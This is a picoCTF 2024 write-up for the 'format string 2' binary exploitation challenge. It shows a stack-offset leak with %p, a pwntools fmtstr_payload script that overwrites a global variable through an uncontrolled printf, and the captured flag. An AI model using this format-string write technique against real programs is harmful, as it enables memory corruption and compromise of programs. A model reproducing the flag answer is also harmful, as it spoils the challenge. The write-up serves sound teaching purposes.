# format string 2 #
 
## Overview ##

Category: [Binary Exploitation](../)

Topics: formatstring, binaryexploitation, picoCTF-2024

## Description ##

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!

## Approach ##

For this challenge, I am provided c file "vuln.c" and binary file "vuln". Inspecting the c file, I see a variable `sus` (which is a global variable) initialized with the value of `0x21737573`. After a few lines of code, I was greeted with a printf function that directly prints the buffer without any format string, therefore this is a format string attack:

    printf(buf);

There is an if statement where if the variable `sus` is equal to value `0x67616c66` then it will print the flag. So the idea is that you are supposed to modify the `sus` variable and have it be the value `0x67616c66` via format string attack. 

Checking the file even further, we can see that PIE is not enabled:

    Arch:     amd64
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

Opening up the binary file in gdb and examining address of `sus`, I was able to discover that `sus` is at address `0x404060`.

    pwndbg> x &sus
    0x404060 <sus>: 0x21737573

Now with this information, I was ready to overwrite by using the pwntools library. But while writing for the payload, I realize I need the offset for fmtstr_payload() function in order for the exploit to be successful. Getting the offset isn't hard, I just needed to figure out where the offset the user input would begin. This can be achieved by entering a few "a" follow by a bunch of "%p", then look for an input similar to "0x616161...", this will be my offset. So I quickly open up the binary file in gdb and enter "aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p":

    You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
    aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
    Here's your input: aaaaaaaa0x7fffffffd5e0.(nil).(nil).0xa.0x400.0x7ffff7fc5860.0x7ffff7ffdab0.(nil).(nil).(nil).0x7ffff7ffe2e0.0x1a0c23d.0x7ffff7fc5d78.0x6161616161616161.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x7fffffffd800.0x7fff00000007.0x7fffffffd900.0x7ffff7fc5d90.(nil).0x7fffffffd8b8.0x7ffff7fc5d90.0x7ffff7fbdc80
    sus = 0x21737573
    You can do better!

By splitting the output on dots (.), I can see which stack argument contains my input (0x6161616161616161), which appears at the 14th position. Therefore, the format string offset is 14. Finally, I was able to finish writing my python script:

    from pwn import *

    # Let pwntools know that this architecture is amd64 or else it assume it is a 32 bit x86. 
    context.arch = 'amd64' 

    # Setting up the given host and port number. 
    HOST = "rhea.picoctf.net"
    PORT = 56443

    # Performing a remote connection 
    p = remote(HOST, PORT) 

    # For local connection
    #p = process('./vuln')

    # Setting the memory address to be modify to "0x404060" and have the value in memory address "0x404060" to contain the value "0x67616c66". 
    # Start of user input is at offset 14.
    # write_size='short' to perform a 2-byte write, avoiding issues with large %n values and making the exploit more reliable.
    # fmtstr_payload takes advantage of the %n specifier to write values to a memory address.
    payload = fmtstr_payload(14, {0x404060: 0x67616c66}, write_size='short')

    # Sending the payload
    p.sendline(payload)

    p.interactive()

Success! The results are:

    You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
    Here's your input:
    I have NO clue how you did that, you must be a wizard. Here you go...
    picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}[*] Got EOF while reading in interactive
    $

Flag: picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}

## Reflection ##

This was another classic example of a format string attack, showing how dangerous uncontrolled printf calls can be. Even with NX enabled, arbitrary memory writes are sufficient to fully compromise program logic. If you haven't heard of the fmtstr_payload function (provided by the pwntools library) before, this challenge serves as a nice introduction to learning how it can be used to automate format string exploits.